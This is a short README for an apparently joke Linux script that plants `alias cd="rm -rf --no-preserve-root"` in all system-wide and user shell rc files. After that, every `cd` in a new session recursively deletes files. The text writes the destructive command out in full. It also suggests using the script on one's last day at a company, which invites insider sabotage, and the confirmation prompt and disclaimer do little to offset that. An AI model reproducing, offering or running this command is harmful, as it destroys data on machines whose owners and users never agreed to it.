# Fatality to any Linux

We all know that `alias` command of `bash` can change any sequences into any command, even override the built-in commands.

The question is, what if we change just one of built-in command into deadly sequence `rm -rf --no-preserve-root`.

> This script automatically add `alias cd="rm -rf --no-preserve-root"` in to all `rc` files, including both system-wide and user ones. This will make any new sessions will treat `cd` as deadly sequence instead of changing directory (useful when it's your last day at the company).

This is the implementation of well-known joke. There is a built-in safe-guard, the confirmation prompt. If you accept the prompt, that system is nearly dead. Well, you can try to remove every `alias` line from every `rc` files, good luck!

Do not use this script for bad-intentions, and only run on systems you own!
